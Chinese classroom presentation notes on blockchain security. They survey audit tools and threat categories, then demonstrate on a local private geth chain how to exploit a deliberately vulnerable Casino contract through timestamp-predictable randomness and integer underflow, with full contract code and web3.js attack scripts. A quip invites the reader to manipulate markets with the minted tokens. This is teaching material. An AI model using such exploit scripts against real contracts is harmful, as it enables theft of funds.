## 课堂演示第二阶段



### 主题

区块链安全杂谈



**我能用什么工具来审计和分析我的代码呢？**

首先，solc执行语义检查是走向安全性的一大步，因为编译时可能会发现潜在的错误。

- [Securify.ch](https://link.zhihu.com/?target=https%3A//securify.ch/)是一个为了智能合约的静态分析工具
- [Remix](https://link.zhihu.com/?target=http%3A//remix.ethereum.org/)也对你的代码静态分析，并能够发现如未初始化的存储指针和重入的错误
- [Oyente](https://link.zhihu.com/?target=https%3A//github.com/melonproject/oyente)是另一个最近发布的智能合约分析工具
- [Hydra](https://link.zhihu.com/?target=https%3A//github.com/IC3Hydra/Hydra)是一个“为了加密经济合约安全性的框架，去中心化安全奖励”
- [Porosity](https://link.zhihu.com/?target=https%3A//github.com/comaeio/porosity)是一个“基于区块链以太坊智能合约的反编译器”
- [Manticore](https://link.zhihu.com/?target=https%3A//github.com/trailofbits/manticore/)是一款带EVM支持的动态二进制分析工具
- [Ethersplay](https://link.zhihu.com/?target=https%3A//github.com/trailofbits/ethersplay)是一个EVM的[Binary Ninja](https://link.zhihu.com/?target=https%3A//binary.ninja/)插件

你可以练习你的智能合约黑客技巧在：

- [Ethernaut](https://link.zhihu.com/?target=https%3A//ethernaut.zeppelin.solutions/)（需要ropsten testnet帐户）

- [HackThisContract](https://link.zhihu.com/?target=http%3A//hackthiscontract.io/)（需要rinkeby testnet帐户

  ​

### 主要内容

区块链技术对互联网安全的冲击（隐私性与匿名性， 促进了勒索木马+肉鸡挖矿+暗网交易等产业链的兴起）

区块链安全的历史重大事件回顾（wannacry 勒索，丝绸之路，比特币硬分叉，币安via代币事件，EOS节点RCE漏洞）

区块链技术本身的安全问题（平台安全，应用安全，协议安全）

主要的观点： 区块链的安全应当受到更高的重视

理由：区块链公有链的运作需要token的激励，因此，可以将该类token视为传统金融与传统技术结合的产物，与传统技术结合，扩大了其安全的攻击面，与传统金融相结合，意味着其攻击收益更高。





### 安全冲击

wannacry（ windows eternal blue exploit）

丝绸之路（dark web）

勒索/僵尸网路产业链的兴起



### 平台安全

eccentric technology works with centric platform 

中心化的平台给hacker的攻击提供了明确稳定的目标。纵观历史，平台可能出现的安全问题主要源自于以下因素：

1.平台自身的漏洞（如RCE，sql注射，xss等）

2.针对平台用于的钓鱼攻击

3.针对平台管理者的钓鱼攻击

4.DDOS攻击与勒索



### 应用安全

此处的应用指的是与区块链与及其代币系统紧密相关的应用：如区块链客户端程序，区块链钱包应用。

主要的安全问题：

1.客户端程序缓冲区溢出/RCE等漏洞

2.钱包应用未授权访问





### 合约安全

一旦协议安全漏洞，就可以攻击区块链的金融系统，从而导致币价暴跌，进一步导致硬分叉甚至于币价归0。

主要的安全漏洞：

1.整数上溢与整数下溢

2.伪随机数安全

3.竞态条件

4.函数未授权访问



### 其他安全

一些难以归类、或者多因素造成的安全隐患：

1.51%攻击

2.以太坊短地址攻击



### 演示

如何利用整数下溢以及伪随机数安全攻击一个casino智能合约

1.使用docker运行geth节点:

定义创世区块test.json：

```json
{
    "config": {
        "chainId": 15,
        "homesteadBlock": 0,
        "eip155Block": 0,
        "eip158Block": 0
    },
    "difficulty": "10000",
    "gasLimit": "2100000",
    "alloc": {
        "7df9a875a174b3bc565e6424a0050ebc1b2d1d82": { "balance": "300000" },
        "f41c74c9ae680c1aa78f42e5647a62f353b7bdde": { "balance": "400000" }
    }
}
```

利用创世区块初始化geth文件夹：

> geth --datadir ./test init test.json

利用geth夹启动geth节点：

> geth --datadir ./test --rpc --rpcaddr 0.0.0.0 console



2.新建两个账号，第一个账号用于挖矿，向第二个账号转账100eth:

> personal.newAccount("haozigege")
>
> personal.newAccount("haozigege")
>
> miner.setEtherbase(eth.accounts[0])
>
> miner.start(1)
>
> ------
>
> miner.stop()
>
> personal.unlockAccount(eth.accounts[0],'haozigege',150000)
>
> personal.unlockAccount(eth.accounts[1],'haozigege',150000)
>
> eth.sendTransaction({from:eth.accounts[0],to:eth.accounts[1],value:100000000000000000000})
>
> miner.start(1)
>
> ------
>
> miner.stop()



3.使用python自动化部署我们的合约：

合约代码：

```js
pragma solidity ^0.4.21;
contract Casino {
    struct SeedComponents {
        uint component1;
        uint component2;
        uint component3;
        uint component4;
    }

    uint private base = 1000;
    uint private gold_price = 1000;

    address private owner;
    mapping (address => uint256) public balanceOf;

    function Casino() public {
        owner = msg.sender;
    }
    
    function init() public payable {
        balanceOf[msg.sender] = 100;
    }

    function seed(SeedComponents components) internal pure returns (uint) {
        uint secretSeed = uint256(keccak256(
            components.component1,
            components.component2,
            components.component3,
            components.component4
        ));
        return secretSeed;
    }
    
    event LogUint(string, uint);
    function log(string s , uint x) internal returns (uint){
        emit LogUint(s, x);
        return 1;
    }
    function bet(uint guess) public payable {
        require(msg.value>1 ether);
        require(balanceOf[msg.sender] > 0);
     	// reduce the guess difficulity 
        uint n = uint(block.timestamp) / base;
        log('timestamp',block.timestamp);

        if (guess != n) {
            balanceOf[msg.sender] = 0;
            // charge 0.5 ether for failure
            msg.sender.transfer(msg.value - 0.5 ether);
            return;
        }
        // charge 1 ether for success
        msg.sender.transfer(msg.value - 1 ether);
        balanceOf[msg.sender] = balanceOf[msg.sender] + 100;
    }

    function paolu() public payable {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function consumption(uint count) public payable{
       require(balanceOf[msg.sender] > 100);
       balanceOf[msg.sender] = balanceOf[msg.sender] - gold_price * count;
    }
}
```



利用broswer-solidity生成字节码和abi接口

字节码：

```
60806040526103e86000556103e860015534801561001c57600080fd5b5060028054600160a060020a031916331790556103788061003e6000396000f30060806040526004361061006c5763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416635c886b34811461007157806370a082311461007e5780637365870b146100be57806373c18c7c146100c9578063e1c7392a146100d1575b600080fd5b61007c6004356100d9565b005b34801561008a57600080fd5b506100ac73ffffffffffffffffffffffffffffffffffffffff60043516610113565b60408051918252519081900360200190f35b61007c600435610125565b61007c61024c565b61007c61028b565b336000908152600360205260409020546064106100f557600080fd5b60015433600090815260036020526040902080549190920290039055565b60036020526000908152604090205481565b6000670de0b6b3a7640000341161013b57600080fd5b336000908152600360205260408120541161015557600080fd5b6000544281151561016257fe5b0490506101a46040805190810160405280600981526020017f74696d657374616d700000000000000000000000000000000000000000000000815250426102a0565b508181146101f95733600081815260036020526040808220829055516706f05b59d3b1ffff19340180156108fc0292909190818181858888f193505050501580156101f3573d6000803e3d6000fd5b50610248565b6040513390670de0b6b3a763ffff19340180156108fc02916000818181858888f19350505050158015610230573d6000803e3d6000fd5b50336000908152600360205260409020805460640190555b5050565b60025473ffffffffffffffffffffffffffffffffffffffff16331461027057600080fd5b60025473ffffffffffffffffffffffffffffffffffffffff16ff5b33600090815260036020526040902060649055565b60007f941296a39ea107bde685522318a4b6c2b544904a5dd82a512748ca2cf839bef783836040518080602001838152602001828103825284818151815260200191508051906020019080838360005b838110156103085781810151838201526020016102f0565b50505050905090810190601f1680156103355780820380516001836020036101000a031916815260200191505b50935050505060405180910390a1506001929150505600a165627a7a723058209ca8f8522f86520ca3844e09495084089874533e9f9d0333b034bd99232336260029
```

abi接口：

```Json
[{"constant":false,"inputs":[{"name":"count","type":"uint256"}],"name":"consumption","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"guess","type":"uint256"}],"name":"bet","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"paolu","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"init","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"","type":"string"},{"indexed":false,"name":"","type":"uint256"}],"name":"LogUint","type":"event"}]
```



自动化部署代码：

```python
#!/usr/bin/env python

import os,sys
import json
import time

target = 'http://127.0.0.1:8545'

casino_bytecode = '60806040526103e86000556103e860015534801561001c57600080fd5b5060028054600160a060020a031916331790556103788061003e6000396000f30060806040526004361061006c5763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416635c886b34811461007157806370a082311461007e5780637365870b146100be57806373c18c7c146100c9578063e1c7392a146100d1575b600080fd5b61007c6004356100d9565b005b34801561008a57600080fd5b506100ac73ffffffffffffffffffffffffffffffffffffffff60043516610113565b60408051918252519081900360200190f35b61007c600435610125565b61007c61024c565b61007c61028b565b336000908152600360205260409020546064106100f557600080fd5b60015433600090815260036020526040902080549190920290039055565b60036020526000908152604090205481565b6000670de0b6b3a7640000341161013b57600080fd5b336000908152600360205260408120541161015557600080fd5b6000544281151561016257fe5b0490506101a46040805190810160405280600981526020017f74696d657374616d700000000000000000000000000000000000000000000000815250426102a0565b508181146101f95733600081815260036020526040808220829055516706f05b59d3b1ffff19340180156108fc0292909190818181858888f193505050501580156101f3573d6000803e3d6000fd5b50610248565b6040513390670de0b6b3a763ffff19340180156108fc02916000818181858888f19350505050158015610230573d6000803e3d6000fd5b50336000908152600360205260409020805460640190555b5050565b60025473ffffffffffffffffffffffffffffffffffffffff16331461027057600080fd5b60025473ffffffffffffffffffffffffffffffffffffffff16ff5b33600090815260036020526040902060649055565b60007f941296a39ea107bde685522318a4b6c2b544904a5dd82a512748ca2cf839bef783836040518080602001838152602001828103825284818151815260200191508051906020019080838360005b838110156103085781810151838201526020016102f0565b50505050905090810190601f1680156103355780820380516001836020036101000a031916815260200191505b50935050505060405180910390a1506001929150505600a165627a7a723058209ca8f8522f86520ca3844e09495084089874533e9f9d0333b034bd99232336260029'


# get the accounts
cmd_1 = 'curl -H "Content-type: application/json" -X POST --data \'{"jsonrpc":"2.0","method":"eth_accounts","params":[],"id":1}\'  %s 2>/dev/null'%(target)
res = os.popen(cmd_1).read()
accounts = json.loads(res)['result']
my_eth_addr = accounts[1]
print '[*] your_eht_address: ' + my_eth_addr

# deploy casino contract via json-rpc
cmd_2 = 'curl -H "Content-type: application/json" -X POST --data \'{"jsonrpc":"2.0","method":"eth_sendTransaction","params":[{"data":"0x%s","gas":"0x100000","from":"%s"}],"id":1}\'  %s 2>/dev/null'%(casino_bytecode,my_eth_addr,target)
res = os.popen(cmd_2).read()
receipt = json.loads(res)['result']
print '[*] receipt_id: ' + receipt

# waiting for the transaction to be received by the miner
print '[*] waiting for mining...'
time.sleep(10)

# get the contract address
cmd_3 = 'curl -H "Content-type: application/json" -X POST --data \'{"jsonrpc":"2.0","method":"eth_getTransactionReceipt","params":["%s"],"id":1}\'  %s 2>/dev/null' %(receipt,target)
res = os.popen(cmd_3).read()
contract_addr = json.loads(res)['result']['contractAddress']
print '[*] contract_address: ' + contract_addr

```

最终我们可以得到我们部署的合约的合约地址contract_addr，通过往该地址转账，可实现相关的函数调用，我们可以调用json-rpc的eth_call接口实现，也可以web3js进行交互。



4.使用web3js攻击合约（伪随机数产生漏洞）：

为了获取到相关信息，我们需要先构造并创建一个合约，在同一区块中出调用合约与原始合约。为了保证两次调用在同一区块中，我们需要在该合约中调用原始合约。

此处，为节约时间，不再使用合约之间相互调用的技巧，通过对漏洞利用的难度进行简化，可以使用本机的时间戳直接进行预测。

攻击代码如下所示：

```Js
var Web3 = require("web3");
// 创建web3对象
var web3 = new Web3();
// 连接到以太坊节点
web3.setProvider(new Web3.providers.HttpProvider("http://127.0.0.1:8545"));

// this is real
var abi = [{"constant":false,"inputs":[{"name":"count","type":"uint256"}],"name":"consumption","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"guess","type":"uint256"}],"name":"bet","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"paolu","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"init","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"","type":"string"},{"indexed":false,"name":"","type":"uint256"}],"name":"LogUint","type":"event"}];

var address = "0x4ffff04ec6f32c97a8f6412528d13975f4ca6e5c";

// 通过ABI和地址获取已部署的合约对象
var casino = new web3.eth.Contract(abi,address);

web3.eth.getAccounts().then( e => {
	var my_eth_address = e[1];
	console.log('[*] your eth address: ' + my_eth_address);

	casino.methods.init().send({from:my_eth_address,value:1});
	casino.methods.balanceOf(my_eth_address).call().then(e => {console.log('[*] my balance: ' + e)});

	var timestamp = new Date().getTime();
	timestamp = (timestamp - timestamp%1000)/1000;
	var guess = (timestamp - timestamp%1000)/1000;
	console.log('[*] my guess: ' + guess);
	casino.methods.bet(guess).send({from:my_eth_address,value:1200000000000000000,gas:0x200000}).then( e => {
		console.log('[*] contract return: ')
		console.log(e.events.LogUint.returnValues);
		casino.methods.balanceOf(my_eth_address).call().then(e => {console.log('[*] my balance: ' + e)});
	}
	);
	}
);
```



最终结果，可以通过运行该程序，得到>100的代币，为后面的溢出攻击做好准备。





5.使用web3js攻击合约（整数下溢漏洞）:

uint类型的数据为无符号整数，可以被上溢（过大归零），也可以被下溢（过小变大），此处演示下溢。

攻击代码如下所示：

```Js
var Web3 = require("web3");
// 创建web3对象
var web3 = new Web3();
// 连接到以太坊节点
web3.setProvider(new Web3.providers.HttpProvider("http://127.0.0.1:8545"));

// this is real
var abi = [{"constant":false,"inputs":[{"name":"count","type":"uint256"}],"name":"consumption","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"guess","type":"uint256"}],"name":"bet","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"paolu","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"init","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"","type":"string"},{"indexed":false,"name":"","type":"uint256"}],"name":"LogUint","type":"event"}];

var address = "0x4ffff04ec6f32c97a8f6412528d13975f4ca6e5c";

// 通过ABI和地址获取已部署的合约对象
var casino = new web3.eth.Contract(abi,address);

web3.eth.getAccounts().then( e => {
	var my_eth_address = e[1];
	console.log('[*] your eth address: ' + my_eth_address);

	casino.methods.balanceOf(my_eth_address).call().then(e => {console.log('[*] my balance: ' + e)});

	casino.methods.consumption(100).send({from:my_eth_address,value:1}).then(
		e => {
			casino.methods.balanceOf(my_eth_address).call().then(e => {console.log('[*] my balance: ' + e)});
			}
		);
	}
);
```



最终我们可以获得巨量的代币：P（操纵币市还是提币，就看你的啦）

![屏幕快照 2018-06-06 上午1.45.02](/Users/haozigege/Desktop/屏幕快照 2018-06-06 上午1.45.02.png)



### 使用到的软件及工具

remix：

https://remix.ethereum.org/

broswer-solidity：

http://chriseth.github.io/browser-solidity/#version=soljson-latest.js&optimize=true

geth：

to start our own eth nodes and test network to deploy the smart contract

web3.js:

interact with the geth json-rpc interface and do some evil thing to the contract